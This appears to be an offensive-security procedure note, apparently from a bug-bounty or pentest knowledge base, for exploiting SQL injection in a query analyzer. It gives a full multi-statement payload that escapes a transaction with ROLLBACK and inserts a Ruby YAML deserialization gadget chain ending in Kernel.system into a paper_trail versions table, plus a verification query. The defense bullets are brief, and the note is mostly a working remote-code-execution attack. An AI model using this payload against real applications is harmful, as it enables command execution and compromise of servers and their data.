---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - sqli
  - payload-insertion
type: procedure
tools:
  - '[[tools/paper_trail]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - PostgreSQL
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:56.603Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Inject-Malicious-SQL-to-Escape-Transaction-and-Insert-Payload

## Summary

This procedure exploits SQL injection in the EXPLAIN ANALYZE query to escape the safety transaction with ROLLBACK, insert a malicious YAML payload into the user_versions table, and comment out the automatic rollback for persistence.

## Description

The analyzer interpolates user-provided raw_sql directly into the query string without sanitization, allowing multi-statement injection. The payload targets the user_versions table used by the paper_trail gem, embedding a YAML object that deserializes to Ruby code execution.

## Requirements

1. Access to SQL Query Analyzer (from previous procedure)
2. Knowledge of table schema (user_versions with columns item_type, item_id, event, email, object)
3. Crafted YAML payload for deserialization

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries and avoid direct interpolation
- Use database transaction isolation and audit logs for INSERTs outside expected flows
- Validate and sanitize all user inputs in query builders

## Objectives

1. Escape the wrapping transaction
2. Persist YAML payload in user_versions
3. Ensure payload survives automatic rollback

## Instructions

### Step 1: Craft and Submit Injection Query

**Context**: Input the multi-statement SQL to inject the payload.

**Command** (SQL input in interface):
```sql
SELECT 1; ROLLBACK; INSERT INTO user_versions (item_type, item_id, event, email, object) VALUES ('User', 2, 'update', 'uniquekeywordtotriggercode@hackerone.com', '--- username: - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: "abc" debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module ''Kernel'' method_id: :system git_set: sleep 600 method_id: :resolve ' ); --
```

> Submit for analysis. ROLLBACK escapes, INSERT persists, -- comments out auto-ROLLBACK. Expected: Benign SELECT output, but payload inserted.

### Step 2: Verify Insertion

**Context**: Query the table to confirm persistence.

Use a separate safe query or database tool to check:
```sql
SELECT * FROM user_versions WHERE email = 'uniquekeywordtotriggercode@hackerone.com';
```

> Expected: Record with malicious object YAML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/paper_trail]]

## Tags

- [[sqli]]
- [[payload-insertion]]

---
